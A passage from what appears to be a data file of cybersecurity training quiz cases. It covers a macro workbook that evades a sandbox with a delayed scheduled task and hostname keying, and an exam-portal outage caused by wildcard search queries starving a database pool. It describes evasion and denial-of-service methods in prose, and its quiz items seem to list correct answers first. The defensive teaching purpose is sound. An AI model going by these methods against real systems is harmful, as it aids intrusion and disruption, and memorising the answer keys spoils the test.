      'Aid_Adjustment_2026.xlsm passes 5-minute dynamic sandbox as CLEAN',
      'Staff member opens workbook and enables macros on FINAID-WS04',
      'Workbook_Open registers scheduled task FontCacheUpdate (+48h)',
      'Scheduled task launches encoded PowerShell to C2 staging URL 48 hours later',
    ],
    hints: [
      'Compare the sandbox runtime (300 seconds) with the scheduled task trigger (+48 hours).',
      'Look at the hostname check "FINAID-*" inside the macro—why would malware check that?',
      'Notice the file extension .xlsm (macro-enabled workbook) from an external sender.',
    ],
    questions: [
      {
        id: 'c9-q1',
        type: 'clue',
        prompt: 'Why did the automated sandbox classify Aid_Adjustment_2026.xlsm as CLEAN?',
        options: [
          'Time-delayed scheduled task (+48h) and FINAID-* hostname check prevented execution during the 5-minute sandbox',
          'PowerShell cannot run inside Microsoft Windows',
          'The sandbox only inspects PDF files, never spreadsheets',
          'The macro was written in Python instead of VBA',
        ],
      },
      {
        id: 'c9-q2',
        type: 'multiple-choice',
        prompt: 'What is the purpose of checking whether the hostname starts with "FINAID-" before decoding the payload?',
        options: [
          'Environment keying / sandbox evasion so generic analysis VMs never trigger the second stage',
          'Improving Excel spreadsheet calculation speed',
          'Automatically translating the spreadsheet into multiple languages',
          'Ensuring the printer driver stays updated',
        ],
      },
      {
        id: 'c9-q3',
        type: 'true-false',
        prompt: 'True or False: Blocking external .xlsm attachments or disabling Mark-of-the-Web macros stops Workbook_Open from creating the task.',
        options: ['True', 'False'],
      },
      {
        id: 'c9-q4',
        type: 'match',
        prompt: 'Match the containment + prevention actions for FINAID-WS04:',
        options: [
          'Isolate FINAID-WS04, delete task FontCacheUpdate, block C2 host, and enforce macro-blocking policy on external Office files',
          'Reboot the workstation and reopen the spreadsheet',
          'Extend sandbox timeout from 5 minutes to 6 minutes',
          'Rename the scheduled task from FontCacheUpdate to SystemUpdate',
        ],
      },
    ],
  },
  {
    id: 'case-10',
    title: 'Blackout Window',
    subtitle: 'Coordinated Exam Portal Outage',
    category: 'Incident Response',
    difficulty: 'Hard',
    duration: 30,
    icon: 'sun',
    color: 'indigo',
    briefing:
      'Ten minutes before mid-term finals, the Exam Portal became unreachable. Initial reports blamed a DDoS flood, yet CPU usage on the app servers was only 8% while the database connection pool hit 100%.',
    incident: 'Simulated multi-layer outage triage across WAF, app pool, and database.',
    evidence: [
      {
        type: 'WAF TELEMETRY',
        title: 'Edge Traffic Breakdown',
        detail:
          'Inbound requests: 1,900 req/s (normal exam start peak is 1,600 req/s). 420 req/s targeted GET /api/exams/search?q= with 8-character wildcards.',
      },
      {
        type: 'APP METRICS',
        title: 'Node Worker & Pool Status',
        detail:
          'App server CPU: 8% | Active DB Pool Connections: 100/100 (100% waiting) | Request latency p99: 29,800 ms.',
      },
      {
        type: 'DB SLOW LOG',
        title: 'Longest Running Queries',
        detail:
          "412 active queries: SELECT * FROM questions WHERE body ILIKE '%a%b%c%d%' ORDER BY created_at DESC; (Full sequential table scan: 14.2s each).",
      },
      {
        type: 'INCIDENT CHAT',
        title: 'On-Call Triage Note',
        detail:
          'A single unauthenticated search route lacked caching, pagination limits, and rate throttling—allowing asymmetric resource exhaustion.',
      },
    ],
    suspects: [
      {
        name: '/api/exams/search Route',
        role: 'Asymmetric Amplification Bottleneck',
        note: 'Unindexed leading-wildcard ILIKE query triggered full table scans per request.',
      },
      {
        name: 'DB Connection Pool (100/100)',
        role: 'Starved Shared Resource',
        note: 'Slow search queries held every connection, blocking legitimate exam submissions.',
      },
      {
        name: 'Volumetric DDoS Hypothesis',
        role: 'Misleading Initial Assumption',
        note: 'Total traffic (1,900 req/s) was barely above normal exam start volume (1,600 req/s).',
      },
    ],
    timeline: [
      'Attacker targets unauthenticated /api/exams/search with wildcard queries',
      'Leading-wildcard ILIKE queries trigger 14.2s sequential table scans',
      'All 100 DB connections saturate, starving exam login and submission routes',
      'Exam portal appears down despite app server CPU sitting at 8%',
    ],
    hints: [
      'Compare total req/s (1,900) against normal peak (1,600)—is this a giant bandwidth flood?',
      'Look at why App CPU is 8% while p99 latency is nearly 30 seconds.',
      'Check the SQL slow log: leading % wildcards with ILIKE bypass standard B-tree indexes.',
    ],
    questions: [
      {
        id: 'c10-q1',
        type: 'clue',
        prompt: 'What actually caused the Exam Portal outage despite low app server CPU (8%)?',
        options: [
          'Application-layer DoS exhausting the 100-connection DB pool via slow wildcard ILIKE queries',
          'A 400 Gbps UDP volumetric flood saturating campus fiber',
          'An expired SSL certificate on the CDN edge',
          'A power outage in the campus library',
        ],
      },
      {
        id: 'c10-q2',
        type: 'true-false',
        prompt: 'True or False: Doubling the number of stateless Node app servers alone would immediately solve the database connection pool saturation.',
        options: ['True', 'False'],
      },
      {
        id: 'c10-q3',
        type: 'multiple-choice',
        prompt: 'What is the fastest safe mitigation during the live exam window to restore student logins and submissions?',
        options: [
          'Rate-limit or temporarily disable the unauthenticated /api/exams/search route and terminate stuck ILIKE queries',
          'Restart the database every 30 seconds throughout the exam',
          'Allow unlimited database connections (100,000+) on the single DB node',
          'Ask all students to clear their browser history',
        ],
      },
      {
        id: 'c10-q4',
        type: 'match',
        prompt: 'Match the long-term architectural fix that prevents search queries from starving core exam traffic:',
        options: [
          'Require authentication + strict rate limits, use indexed full-text search / trigram GIN index with statement timeouts, and isolate search read-replicas',
          'Remove indexes from the questions table to speed up reads',
          'Increase app server RAM from 8 GB to 64 GB without changing SQL',
          'Serve SQL error stack traces directly to the WAF',
        ],
      },
    ],
  },
];
